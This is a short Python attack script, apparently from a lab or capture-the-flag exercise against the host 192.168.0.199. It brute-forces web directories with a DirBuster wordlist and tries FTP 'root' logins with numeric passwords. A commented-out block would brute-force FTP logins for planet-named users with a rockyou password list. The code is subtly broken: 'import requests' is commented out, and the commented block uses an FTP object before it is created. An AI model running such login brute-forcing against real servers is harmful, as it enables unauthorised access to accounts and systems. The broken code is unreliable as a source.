# import requests
with open("/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt", encoding="utf-8") as f:
    directories = f.readlines()
    for dir in directories:
        dir = dir.strip()
        url = f"http://192.168.0.199/{dir}"
        response = requests.get(url)
        if response.status_code != 404:
            print(url)
import ftplib
# users = ["mercury", "venus", "earth", "mars", "jupiter", "saturn", "uranus", "neptune"]
# with open("/usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt", encoding="utf-8") as f:
#     passwords = f.readlines()
#     targethost = "192.168.0.199"
#     clean_users=[]
#     clean_passwords=[]
#     for user in users:
#         clean_users.append(user.strip())
#     for passwd in passwords:
#         clean_passwords.append(passwd.strip())
#     for user in clean_users:
#         for passwd in clean_passwords:
#             print(user, passwd)
#             try:
#                 ftpserver.connect(targethost, 21, timeout=2)
#                 ftpserver.login(user, passwd)
#                 print("SUKCES", user, passwd)
#                 ftpserver.close()
#             except:
#                 pass
ftpserver = ftplib.FTP()
for code in range(665, 671):
    print(code)
    try:
        ftpserver.connect("192.168.0.199", 21, timeout=5)
        ftpserver.login("root", str(code))
        print("SUKCES", code)
        ftpserver.close()
    except:
        pass
